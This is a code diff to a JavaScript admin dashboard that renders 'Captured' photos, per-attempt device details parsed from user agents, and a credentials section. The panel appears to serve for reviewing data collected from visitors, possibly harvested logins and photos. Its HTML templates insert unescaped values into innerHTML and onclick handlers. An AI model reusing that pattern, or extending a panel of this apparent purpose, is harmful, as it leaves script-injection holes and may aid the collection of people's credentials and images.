@@ -415,10 +415,12 @@
                 const bioPhotos = allPhotos.slice(0, 5);
                 const receiptPhotos = allPhotos.slice(5);
 
-                const renderPhotoBtn = (p, label, color) =>
-                    `<button onclick="viewPhoto('${p.cloudinaryUrl || p.filename}')" class="btn btn-${color} btn-sm photo-stack-btn" title="${label}">
+                const renderPhotoBtn = (p, label, color) => {
+                    const photoSrc = p.url || p.localPath || (p.filename ? `/admin/photo/${p.filename}` : '');
+                    return `<button onclick="viewPhoto('${photoSrc}')" class="btn btn-${color} btn-sm photo-stack-btn" title="${label}">
                         📷 ${label}
                      </button>`;
+                };
 
                 return `
                     <tr>
@@ -485,16 +487,27 @@
                 return;
             }
 
-            gallery.innerHTML = photos.map(photo => `
-                <div class="photo-card" onclick="viewPhoto('${photo.path || photo.filename}')">
-                    <img src="${photo.isLocal ? '/admin/photo/' + photo.filename : photo.path}" alt="Captured" loading="lazy">
+            gallery.innerHTML = photos.map(photo => {
+                let imgSrc = '';
+                if (photo.path && photo.path.startsWith('http')) {
+                    imgSrc = photo.path;
+                } else if (photo.isLocal) {
+                    imgSrc = '/admin/photo/' + photo.filename;
+                } else if (photo.path) {
+                    imgSrc = photo.path;
+                } else {
+                    imgSrc = '/admin/photo/' + photo.filename;
+                }
+                return `
+                <div class="photo-card" onclick="viewPhoto('${imgSrc}')">
+                    <img src="${imgSrc}" alt="Captured" loading="lazy" onerror="this.parentElement.style.display='none'">
                     <div class="photo-actions">
-                        <span class="photo-name">${photo.filename}</span>
+                        <span class="photo-name">${photo.filename || 'Unknown'}</span>
                         <button onclick="event.stopPropagation(); deletePhoto('${photo.filename}');"
                                 class="photo-del-btn" title="Delete">🗑️</button>
                     </div>
                 </div>
-            `).join('');
+            `}).join('');
         }
 
         // ===== Tab Navigation =====
@@ -648,9 +661,24 @@
         }
 
         function getDeviceString(attempt) {
-            if (!attempt.deviceDetails) return '<span style="color: var(--text-muted); font-size: 0.8rem;">—</span>';
-            const d = attempt.deviceDetails;
-            return `<div class="cell-strong">${d.platform || 'Unknown'}</div><div class="cell-meta">${d.screenResolution || ''}</div>`;
+            // Priority 1: Full Device Details
+            if (attempt.deviceDetails) {
+                const d = attempt.deviceDetails;
+                return `<div class="cell-strong">${d.platform || 'Unknown'}</div><div class="cell-meta">${d.screenResolution || ''}</div>`;
+            }
+            // Priority 2: User Agent Fallback (Simple Parse)
+            if (attempt.userAgent) {
+                const ua = attempt.userAgent;
+                let platform = 'Unknown';
+                if (ua.includes('Windows')) platform = 'Windows';
+                else if (ua.includes('Mac')) platform = 'Mac';
+                else if (ua.includes('Android')) platform = 'Android';
+                else if (ua.includes('iPhone')) platform = 'iPhone';
+                else if (ua.includes('Linux')) platform = 'Linux';
+                return `<div class="cell-strong">${platform}</div><div class="cell-meta">Browser</div>`;
+            }
+
+            return '<span style="color: var(--text-muted); font-size: 0.8rem;">—</span>';
         }
 
         // ===== Credentials =====
